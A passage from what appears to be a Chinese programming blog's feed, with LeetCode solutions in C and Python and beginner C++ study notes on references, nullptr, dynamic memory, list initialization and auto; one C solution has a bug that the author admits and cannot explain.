<span class="hljs-title function_">getKthFromEnd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head, <span class="hljs-type">int</span> k)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">p1</span>;</span><br>    p1 = head;<br>    <span class="hljs-keyword">for</span>(;k&gt;<span class="hljs-number">0</span>;k--)&#123;<br>        p1 = p1-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(p1!=<span class="hljs-literal">NULL</span>)&#123;<br>        p1 = p1-&gt;next;<br>        head = head-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-左叶子之和"><a href="#4-左叶子之和" class="headerlink" title="4.左叶子之和"></a>4.左叶子之和</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>计算给定二叉树的所有左叶子之和。</p><h3 id="4-2思路分析"><a href="#4-2思路分析" class="headerlink" title="4.2思路分析"></a>4.2思路分析</h3><p>用递归算法比较容易，采用广度优先递归遍历算法，递归时判断该节点是不是叶节点以及是不是左叶节点。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sumOfLeftLeaves</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(root-&gt;left != <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;left-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;left-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>        ret += root-&gt;left-&gt;val;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sumOfLeftLeaves(root-&gt;left)+sumOfLeftLeaves(root-&gt;right)+ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-拼写单词"><a href="#5-拼写单词" class="headerlink" title="5.拼写单词"></a>5.拼写单词</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>给你一份『词汇表』（字符串数组） words 和一张『字母表』（字符串） chars。</p><p>假如你可以用 chars 中的『字母』（字符）拼写出 words 中的某个『单词』（字符串），那么我们就认为你掌握了这个单词。</p><p>注意：每次拼写时，chars 中的每个字母都只能用一次。</p><p>返回词汇表 words 中你掌握的所有单词的 <strong>长度之和</strong>。</p><p><strong>示例：</strong></p><p>输入：words &#x3D; [“cat”,”bt”,”hat”,”tree”], chars &#x3D; “atach”<br>输出：6<br>解释：可以形成字符串 “cat” 和 “hat”，所以答案是 3 + 3 &#x3D; 6。</p><h3 id="5-2思路分析"><a href="#5-2思路分析" class="headerlink" title="5.2思路分析"></a>5.2思路分析</h3><p>本题使用python解答很简单，只需要判定单词列表中的每个字母数量是否小于等于给定的字符串中的即可，使用字符串的count()方法即可</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">countCharacters</span>(<span class="hljs-params">self, words: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], chars: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> words:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w:<br>                <span class="hljs-keyword">if</span> w.count(i) &lt;= chars.count(i):<br>                    flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>                result += <span class="hljs-built_in">len</span>(w)<br>        <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h2 id="6-优美的排列"><a href="#6-优美的排列" class="headerlink" title="6.优美的排列"></a>6.优美的排列</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>给定两个整数 n 和 k，你需要实现一个数组，这个数组包含从 1 到 n 的 n 个不同整数，同时满足以下条件：</p><p>① 如果这个数组是 [a1, a2, a3, … , an] ，那么数组 [|a1 - a2|, |a2 - a3|, |a3 - a4|, … , |an-1 - an|] 中应该有且仅有 k 个不同整数；.</p><p>② 如果存在多种答案，你只需实现并返回其中任意一种.<br>题目链接：<a href="https://leetcode-cn.com/problems/beautiful-arrangement-ii">https://leetcode-cn.com/problems/beautiful-arrangement-ii</a></p><h3 id="6-2思路分析"><a href="#6-2思路分析" class="headerlink" title="6.2思路分析"></a>6.2思路分析</h3><p>找规律即可，下标段[0, k]中，偶数下标填充[1,2,3..]，下标段[0, k]中，奇数下标填充[k + 1, k, k - 1…]，下标段[k + 1, n - 1]都是顺序填充。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note: The returned array must be malloced, assume caller calls free().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span>* <span class="hljs-title function_">constructArray</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span>* returnSize)</span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    returnSize = (<span class="hljs-type">int</span>* )<span class="hljs-built_in">malloc</span>(n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-type">int</span> numK = k + <span class="hljs-number">1</span>, numTemp = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//下标段[0, k]中，偶数下标填充[1,2,3..]</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= k; i += <span class="hljs-number">2</span>)&#123;<br>        returnSize[i] = numTemp++;<br>    &#125;<br>    <span class="hljs-comment">//下标段[0, k]中，奇数下标填充[k + 1, k, k - 1...]</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= k; i += <span class="hljs-number">2</span>)&#123;<br>        returnSize[i] = numK--;<br>    &#125;<br>    <span class="hljs-comment">//下标段[k + 1, n - 1]都是顺序填充</span><br><span class="hljs-keyword">for</span> (i = k + <span class="hljs-number">1</span>; i &lt; n; ++i) &#123;<br>returnSize[i] = i + <span class="hljs-number">1</span>;<br>&#125;<br>    <span class="hljs-keyword">return</span> returnSize;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span>* returnSize;<br><span class="hljs-type">int</span> n,k,i;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);<br>returnSize=constructArray(n,k,returnSize);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; n;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,returnSize[i]);<br>&#125;<br><span class="hljs-built_in">free</span>(returnSize);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>自己运行的结果是对的，但是oj平台一直显示溢出，不知道啥原因，内存分配和访问都没问题啊，蜜汁操作。</p><h2 id="7-旋转数字"><a href="#7-旋转数字" class="headerlink" title="7.旋转数字"></a>7.旋转数字</h2><h3 id="7-1题目描述"><a href="#7-1题目描述" class="headerlink" title="7.1题目描述"></a>7.1题目描述</h3><p>我们称一个数 X 为好数, 如果它的每位数字逐个地被旋转 180 度后，我们仍可以得到一个有效的，且和 X 不同的数。要求每位数字都要被旋转。</p><p>如果一个数的每位数字被旋转以后仍然还是一个数字， 则这个数是有效的。0, 1, 和 8 被旋转后仍然是它们自己；2 和 5 可以互相旋转成对方；6 和 9 同理，除了这些以外其他的数字旋转以后都不再是有效的数字。</p><p>现在我们有一个正整数 N, 计算从 1 到 N 中有多少个数 X 是好数？</p><p><strong>示例:</strong><br>输入: 10<br>输出: 4<br>解释:<br>在[1, 10]中有四个好数： 2, 5, 6, 9。<br>注意 1 和 10 不是好数, 因为他们在旋转之后不变。</p><p>来源：<a href="https://leetcode-cn.com/problems/rotated-digits">https://leetcode-cn.com/problems/rotated-digits</a></p><h3 id="7-2思路分析"><a href="#7-2思路分析" class="headerlink" title="7.2思路分析"></a>7.2思路分析</h3><p>保证每位都在(2, 5, 6, 9, 0, 1, 8)内，至少一位在(2, 5, 6, 9)内即可，采用暴力破解法。</p><h3 id="7-3代码"><a href="#7-3代码" class="headerlink" title="7.3代码"></a>7.3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rotatedDigits</span>(<span class="hljs-params">self, N: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        s1 = <span class="hljs-string">&#x27;2569018&#x27;</span><br>        s2 = <span class="hljs-string">&#x27;2569&#x27;</span><br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,N+<span class="hljs-number">1</span>):<br>            flag1,flag = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>            sN = <span class="hljs-built_in">str</span>(j)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sN:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> s1 :<br>                    flag1 = <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> s2:<br>                        flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flag1 == <span class="hljs-number">1</span>:<br>                result+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h3 id="7-4最优解"><a href="#7-4最优解" class="headerlink" title="7.4最优解"></a>7.4最优解</h3><p><strong>思路</strong><br>根据好数定义，每个好数只能包含数字 0125689，并且至少包含 2569 中的一个。因此可以逐个写出小于等于 N 的所有好数。<br>这道题目可以使用动态规划解答。状态可以表示为三个变量 i, equality_flag, involution_flag。其中 i 表示当前正在写第 i 位数字；equality_flag 表示已经写出的 j 位数字是否等于 N 的 j 位前缀；involution_flag 表示从最高位到比当前位高一位的这段前缀中是否含有 2569 中的任意一个数字。<br>dp(i, equality_flag, involution_flag) 表示在特定 equality_flag，involution_flag 的状态下，有多少种从 i 到末尾的后缀能组成一个好数。最终的结果为 dp(0, True, False)。<br>注：数字 N 从最高位到最低位的索引，从 0 开始，并依次增大。第 i 位表示索引为 i 的位置。<br><strong>算法</strong><br>如果 equality_flag 为 true，表示第 i 位能取到的最大数字为 N 的第 i 位对应的数字。并且还需要根据当前状态决定可以写哪些数字。<br>在代码实现中，我们分别使用了自顶向下的方法和自底向上的方式。Python 代码实现的是自顶向下的方法，从 for d in xrange(…) 到 memo[…] &#x3D; ans 这四行代码清晰的说明了状态之间的递归关系。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rotatedDigits</span>(<span class="hljs-params">self, N</span>):<br>        A = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>(N))<br><br>        memo = &#123;&#125;<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i, equality_flag, involution_flag</span>):<br>            <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(A): <span class="hljs-keyword">return</span> +(involution_flag)<br>            <span class="hljs-keyword">if</span> (i, equality_flag, involution_flag) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> memo:<br>                ans = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> xrange(A[i] + <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> equality_flag <span class="hljs-keyword">else</span> <span class="hljs-number">10</span>):<br>                    <span class="hljs-keyword">if</span> d <span class="hljs-keyword">in</span> &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;: <span class="hljs-keyword">continue</span><br>                    ans += dp(i+<span class="hljs-number">1</span>, equality_flag <span class="hljs-keyword">and</span> d == A[i],<br>                              involution_flag <span class="hljs-keyword">or</span> d <span class="hljs-keyword">in</span> &#123;<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>&#125;)<br>                memo[i, equality_flag, involution_flag] = ans<br>            <span class="hljs-keyword">return</span> memo[i, equality_flag, involution_flag]<br><br>        <span class="hljs-keyword">return</span> dp(<span class="hljs-number">0</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++学习笔记1</title>
    <link href="/blog/2020/02/20/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%BF%B91/"/>
    <url>/blog/2020/02/20/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%BF%B91/</url>
    
    <content type="html"><![CDATA[<p><strong>继续本周的C++学习任务。</strong></p><p><img src="/images/fj31.jpg"></p><span id="more"></span><h1 id="C语法的增强及对应的C-特性"><a href="#C语法的增强及对应的C-特性" class="headerlink" title="C语法的增强及对应的C++特性"></a>C语法的增强及对应的C++特性</h1><h2 id="引用、-C-11-空指针与动态内存分配"><a href="#引用、-C-11-空指针与动态内存分配" class="headerlink" title="引用、[C++11]空指针与动态内存分配"></a>引用、[C++11]空指针与动态内存分配</h2><h3 id="引用Reference"><a href="#引用Reference" class="headerlink" title="引用Reference"></a>引用Reference</h3><p>引用就是另一个变量的别名，通过引用所做的读写操作实际上是作用于原变量上。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span>&amp; rx=x;<br></code></pre></td></tr></table></figure><p>C++指针与引用符号应靠近其类型名而非名字。</p><p>引用可以作为函数参数，但调用时只需要传递普通变量即可。在被调用函数中改变引用变量的值，则改变的是实际参数的值。</p><h3 id="空指针和动态内存分配"><a href="#空指针和动态内存分配" class="headerlink" title="空指针和动态内存分配"></a>空指针和动态内存分配</h3><p>1.空指针</p><p>1.1 0带来的二义性问题</p><ol><li>C++03中，空指针使用“0”来表示。0既是一个常量整数，也是一个常量空指针。</li><li>C语言中，空指针使用(void *)0来表示</li><li>有时候，用“NULL”来表示空指针(一种可能的实现方式是#define NULL  0)</li></ol><p>1.2 C++标准化委员会希望“空指针”是一个确定的东西。<br>C++11中引入保留字“nullptr”作为空指针</p><p>2.动态内存管理：分配&#x2F;释放</p><p>2.1     C++中通过运算符new申请动态内存</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">new</span>  &lt;类型名&gt; (初值) ;     <span class="hljs-comment">//申请一个变量的空间</span><br><span class="hljs-keyword">new</span>  &lt;类型名&gt;[常量表达式] ;   <span class="hljs-comment">//申请数组</span><br></code></pre></td></tr></table></figure><p>如果申请成功，返回指定类型内存的地址；<br>如果申请失败，抛出异常，或者返回空指针(nullptr)。(C++11)</p><p>2.2.       动态内存使用完毕后，要用delete运算符来释放。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">delete</span>   &lt;指针名&gt;;    <span class="hljs-comment">//删除一个变量/对象</span><br><span class="hljs-keyword">delete</span> []  &lt;指针名&gt;;     <span class="hljs-comment">//删除数组空间</span><br></code></pre></td></tr></table></figure><h2 id="数据类型与转换、列表初始化"><a href="#数据类型与转换、列表初始化" class="headerlink" title="数据类型与转换、列表初始化"></a>数据类型与转换、列表初始化</h2><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>逻辑运算符和C语言基本一致</p><p>注：编码规范：布尔变量&#x2F;函数的命名应使用前缀“is”，断行必须很明显，在逗号或运算符后换行，新行要对齐</p><h3 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h3><p>列表初始化是C++11的一个新特性，“列表”是用花括号括起来的一(些)值。</p><p>列表初始化分为两类：</p><ul><li>直接列表初始化</li><li>拷贝列表初始化</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//直接列表初始化)</span><br><span class="hljs-comment">/* Variable initialization */</span> <br><span class="hljs-type">int</span> x&#123;&#125;; <span class="hljs-comment">// x is 0; </span><br><span class="hljs-type">int</span> y&#123; <span class="hljs-number">1</span> &#125;; <span class="hljs-comment">// y is 1; </span><br><span class="hljs-comment">/* Array initialization */</span> <br><span class="hljs-type">int</span> array1[]&#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> &#125;; <br><span class="hljs-type">char</span> s1[ <span class="hljs-number">3</span> ] &#123; <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span> &#125;; <br><span class="hljs-type">char</span> s3[]&#123; <span class="hljs-string">&quot;Hello&quot;</span> &#125;; <br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//拷贝列表初始化</span><br><span class="hljs-comment">/* Variable initialization */</span> <br><span class="hljs-type">int</span> z = &#123; <span class="hljs-number">2</span> &#125;; <br><span class="hljs-comment">/* Array initialization */</span> <br><span class="hljs-type">int</span> array2[] = &#123; <span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> &#125;; <br><span class="hljs-type">char</span> s2[] = &#123; <span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span> &#125;; <br><span class="hljs-type">char</span> s4[] = &#123; <span class="hljs-string">&quot;World&quot;</span> &#125;;<br><span class="hljs-type">char</span> s5[] = <span class="hljs-string">&quot;Aloha&quot;</span>; <span class="hljs-comment">// Omit curly braces (省略花括号)</span><br></code></pre></td></tr></table></figure><p>尽量使用列表初始化，列表初始化不允许丢失数据精度的隐式类型转换。</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>类型转换有两种：</p><p><strong>1.隐式类型转换</strong></p><ul><li>由编译器按照数据类型的转换规则自动转换，无需程序员干预。</li><li>可能导致数据精度损失，或者转换失败。</li><li>应尽量避免使用隐式类型转换</li></ul><p><strong>2 显式类型转换（即：强制类型转换）</strong></p><ul><li>由程序员用明确的类型转换语法写出类型转换代码。</li><li>好处是，程序员知道自己要做什么并且把这个想法明确表达出来。</li></ul><p>C++风格强制类型转换：<strong>语法：static_cast<type> value</strong></p><p>编码规范：类型转换必须显式声明，永远不要依赖隐式类型转换。</p><h2 id="自动类型推导：类型系统、auto与decltype"><a href="#自动类型推导：类型系统、auto与decltype" class="headerlink" title="自动类型推导：类型系统、auto与decltype"></a>自动类型推导：类型系统、auto与decltype</h2><p><strong>静态类型 v.s. 动态类型：</strong></p><p>程序设计语言的类型系统机制会检查连接在一起的多个块的一致性</p><p>上述检查若发生在编译期，称为静态类型<br>上述检查若发生在运行时，称为动态类型<br>上述检查若同时存在于编译期和运行时，称为混合类型</p><h3 id="自动类型推导：auto关键字"><a href="#自动类型推导：auto关键字" class="headerlink" title="自动类型推导：auto关键字"></a>自动类型推导：auto关键字</h3><h4 id="1-关键字auto"><a href="#1-关键字auto" class="headerlink" title="1.关键字auto"></a>1.关键字auto</h4><p>C++11中，auto关键字放在变量之前，作用是在声明变量的时候根据变量初始值的类型自动为此变量选择匹配的类型。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">auto</span> au_a = a;<br>cout &lt;&lt; <span class="hljs-built_in">typeid</span>(au_a).<span class="hljs-built_in">name</span>()endl;<br></code></pre></td></tr></table></figure><h4 id="2-auto的使用限制"><a href="#2-auto的使用限制" class="headerlink" title="2.auto的使用限制"></a>2.auto的使用限制</h4><p>1.auto 变量必须在定义时初始化，这类似于const关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> a1 = <span class="hljs-number">10</span>;  <span class="hljs-comment">//正确</span><br><span class="hljs-keyword">auto</span> b1;   <span class="hljs-comment">//错误,编译器无法推导b1的类型</span><br>b1 = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p>2.定义在一个auto序列的变量必须始终推导成同一类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> a4 = <span class="hljs-number">10</span>, a5&#123;<span class="hljs-number">20</span>&#125;;   <span class="hljs-comment">//正确 </span><br><span class="hljs-keyword">auto</span> b4&#123;<span class="hljs-number">10</span>&#125;, b5 = <span class="hljs-number">20.0</span>; <span class="hljs-comment">//错误,没有推导为同一类型</span><br></code></pre></td></tr></table></figure><p>3.如果初始化表达式是引用或const，则去除引用或const语义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a&#123;<span class="hljs-number">10</span>&#125;; <span class="hljs-type">int</span> &amp;b = a;<br><span class="hljs-keyword">auto</span> c = b;   <span class="hljs-comment">//c的类型为int而非int&amp;（去除引用）</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> a1&#123;<span class="hljs-number">10</span>&#125;;<br><span class="hljs-keyword">auto</span> b1 = a1; <span class="hljs-comment">//b1的类型为int而非const int（去除const）</span><br></code></pre></td></tr></table></figure><p>4.如果auto关键字带上&amp;号，则不去除引用或const语意</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>; <span class="hljs-type">int</span>&amp; b = a;<br><span class="hljs-keyword">auto</span>&amp; d = b;<span class="hljs-comment">//此时d的类型才为int&amp;</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> a2 = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">auto</span>&amp; b2 = a2;<span class="hljs-comment">//因为auto带上&amp;，故不去除const，b2类型为const in</span><br></code></pre></td></tr></table></figure><p>5.初始化表达式为数组时，auto关键字推导类型为指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a3[<span class="hljs-number">3</span>] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;;<br><span class="hljs-keyword">auto</span> b3 = a3;<br>cout &lt;&lt; <span class="hljs-built_in">typeid</span>(b3).<span class="hljs-built_in">name</span>() &lt;&lt; endl; <span class="hljs-comment">//输出int * （输出与编译器有关）</span><br></code></pre></td></tr></table></figure><p>6.若表达式为数组且auto带上&amp;，则推导类型为数组类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a7[<span class="hljs-number">3</span>] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;;<br><span class="hljs-keyword">auto</span>&amp; b7 = a7;<br>cout &lt;&lt; <span class="hljs-built_in">typeid</span>(b7).<span class="hljs-built_in">name</span>() &lt;&lt; endl; <span class="hljs-comment">//输出int [3] （输出与编译器有关）</span><br></code></pre></td></tr></table></figure><p>7.C++14中，auto可以作为函数的返回值类型和参数类型</p>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++学习笔记0</title>
    <link href="/blog/2020/02/10/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B00/"/>
    <url>/blog/2020/02/10/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B00/</url>
    
